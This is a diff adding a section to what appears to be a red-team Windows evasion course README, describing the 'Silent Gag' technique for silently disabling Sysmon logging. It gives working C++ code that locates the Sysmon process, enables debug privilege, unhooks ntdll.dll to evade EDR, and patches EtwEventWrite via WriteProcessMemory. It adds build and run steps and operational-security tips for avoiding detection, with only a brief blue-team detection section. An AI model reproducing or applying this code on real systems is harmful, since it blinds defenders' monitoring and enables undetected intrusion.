@@ -2270,3 +2270,244 @@ Each technique produces different artifacts:
 - SwiftOnSecurity Sysmon configuration for reference rulesets
 
 </details>
+
+
+
+
+
+<details>
+<summary>08 - Dancing with Sysmon-Silent Gag</summary>
+      
+[03.Local-admin/03.Sysmon/04.SilentGag](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/03.Sysmon/04.SilentGag)
+
+
+A sophisticated technique to silently disable Sysmon logging without leaving traces in event logs or requiring system reboot.
+
+## Overview
+
+The Silent Gag technique provides a stealthy method to disable Sysmon monitoring by patching the `EtwEventWrite` function within the Sysmon process itself. Unlike previous methods that unload drivers or modify configurations, this approach leaves no error logs and is completely ephemeral - all changes are reversed when the service restarts.
+
+## How Silent Gag Works
+
+### Core Concept
+Instead of attacking Sysmon's driver or configuration, we patch the `EtwEventWrite` function in the Sysmon service process memory. This function is responsible for writing all ETW (Event Tracing for Windows) events to the log. By patching it to simply return without doing anything, we effectively "gag" Sysmon without triggering any error conditions.
+
+### Key Advantages
+- **No Log Evidence**: Unlike driver unloading, this leaves no error events in Sysmon logs
+- **No Reboot Required**: Changes take effect immediately
+- **Ephemeral**: Service restart completely reverses the patch
+- **Stealthy**: Sysmon appears to be running normally to monitoring systems
+
+## Step-by-Step Implementation
+
+### Step 1: Pre-Execution Verification
+
+Before applying the gag, verify that Sysmon is actively logging:
+
+```cmd
+# Check if Sysmon driver is loaded
+fltmc instances | findstr "Sysmon"
+
+# Generate test events to verify logging
+notepad.exe
+nslookup google.com
+ping twitter.com
+```
+
+Confirm these activities are being logged in Event Viewer under `Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`.
+
+### Step 2: Process Discovery
+
+The code first locates the Sysmon process:
+
+```cpp
+int FindTarget(const char *procname) {
+    HANDLE hProcSnap;
+    PROCESSENTRY32 pe32;
+    int pid = 0;
+    
+    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    // ... iterate through processes to find "onedrv.exe"
+    return pid;
+}
+```
+
+### Step 3: Privilege Escalation
+
+Enable `SE_DEBUG_NAME` privilege to allow process memory manipulation:
+
+```cpp
+if (!SetPrivilege(SE_DEBUG_NAME, ENABLE))
+    return -1;
+```
+
+### Step 4: Unhooking ntdll.dll (Anti-Detection)
+
+The code includes sophisticated anti-detection measures:
+
+```cpp
+// Load clean copy of ntdll.dll from disk
+hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+// Create memory mapping
+hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
+
+// Copy clean .text section over potentially hooked version
+ret = UnhookNtdll(GetModuleHandle("ntdll.dll"), pMapping);
+```
+
+This prevents EDR hooks from detecting the memory patching activity.
+
+### Step 5: Applying the Gag Patch
+
+The core function that disables Sysmon logging:
+
+```cpp
+int GagSysmon(HANDLE hProc) {
+    void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
+    
+#ifdef _WIN64
+    // xor rax, rax; ret - immediately return 0 (success)
+    char patch[] = "\x48\x33\xc0\xc3";
+#else
+    // xor eax, eax; ret 14 - immediately return 0 (success)  
+    char patch[] = "\x33\xc0\xc2\x14\x00";
+#endif
+
+    WriteProcessMemory(hProc, pEventWrite, (PVOID) patch, sizeof(patch), NULL);
+    FlushInstructionCache(hProc, pEventWrite, 4096);
+    
+    return 0;
+}
+```
+
+**What the patch does:**
+- Replaces `EtwEventWrite` function with minimal assembly that immediately returns 0 (success)
+- This prevents any ETW events from being written to the log
+- The function appears to succeed but no data is actually logged
+
+### Step 6: Post-Execution Verification
+
+After running the tool, verify that logging has stopped:
+
+```cmd
+# Generate test events that should no longer be logged
+notepad.exe
+nslookup sector7.net
+ping google.com
+```
+
+Check Event Viewer - no new events should appear during the gag period.
+
+## Building and Execution
+
+### Compilation
+```cmd
+cl implant.cpp
+```
+
+### Execution
+```cmd
+implant.exe
+```
+
+**Expected Output:**
+```
+Killing Sysmon...done!
+```
+
+## Technical Details
+
+### Assembly Patch Explanation
+
+**x64 Patch:**
+```asm
+48 33 C0    xor rax, rax    ; Set return value to 0 (success)
+C3          ret             ; Return immediately
+```
+
+**x86 Patch:**
+```asm
+33 C0       xor eax, eax    ; Set return value to 0 (success)  
+C2 14 00    ret 14          ; Return and clean up stack
+```
+
+### Memory Protection Bypass
+
+The code uses `WriteProcessMemory` which automatically handles memory protection changes. The `FlushInstructionCache` ensures the CPU uses the patched code.
+
+### Ephemeral Nature
+
+The patch is not persistent:
+- **Service Restart**: `sc stop onedrv && sc start onedrv` completely reverses the patch
+- **System Reboot**: All changes are lost after reboot
+- **Manual Reversion**: The original function bytes are not preserved, but service restart fixes everything
+
+## Detection and Monitoring
+
+### What Blue Teams Should Look For
+
+1. **Process Memory Modifications**: 
+   - `WriteProcessMemory` calls targeting known security processes
+   - Changes to `EtwEventWrite` function in process memory
+
+2. **Privilege Usage**:
+   - `SE_DEBUG_NAME` privilege being enabled
+   - Process handle acquisition with `PROCESS_VM_WRITE` rights
+
+3. **Behavioral Patterns**:
+   - Sudden cessation of Sysmon logs from a specific host
+   - Service stability without expected logging
+
+### Defense Strategies
+
+- **Memory Integrity Monitoring**: Detect modifications to critical functions in security processes
+- **Privilege Auditing**: Alert on `SE_DEBUG_NAME` privilege escalation
+- **Behavioral Analysis**: Correlate process manipulation with logging cessation
+- **Service Monitoring**: Watch for unusual access patterns to Sysmon service
+
+## Operational Considerations
+
+### Advantages
+- **Complete Log Suppression**: No process creation, network, or DNS events logged
+- **No Service Disruption**: Sysmon service continues running normally
+- **Quick Reversion**: Service restart completely removes the gag
+- **Low Privilege Requirement**: Only requires local administrator rights
+
+### Limitations
+- **Temporary Effect**: Patch is lost on service restart or reboot
+- **Process-Specific**: Only affects the patched Sysmon instance
+- **Detection Risk**: Advanced EDR may detect the memory patching
+- **x86/x64 Specific**: Requires different patches for different architectures
+
+## Comparison with Other Techniques
+
+| Technique | Persistence | Log Evidence | Reboot Required | Stealth Level |
+|-----------|-------------|--------------|-----------------|---------------|
+| Driver Unload | Until service restart | Error logs | No | Medium |
+| Altitude Conflict | Permanent | Error logs | Yes | Low |
+| Configuration Change | Permanent | Configuration change logs | No | Low |
+| **Silent Gag** | **Until service restart** | **No evidence** | **No** | **High** |
+
+## Recovery and Reversion
+
+To restore normal Sysmon operation:
+
+```cmd
+# Simple service restart completely reverses the patch
+sc stop onedrv
+sc start onedrv
+```
+
+## Operational Security
+
+- Run the tool from memory rather than disk to avoid process creation logs
+- Time operations during periods of high system activity
+- Consider combining with other techniques for layered defense evasion
+- Monitor blue team responses to gauge detection
+
+The Silent Gag technique represents a sophisticated approach to Sysmon neutralization that prioritizes stealth and minimal forensic footprint, making it ideal for red team operations where detection avoidance is critical.
+
+      
+</details>
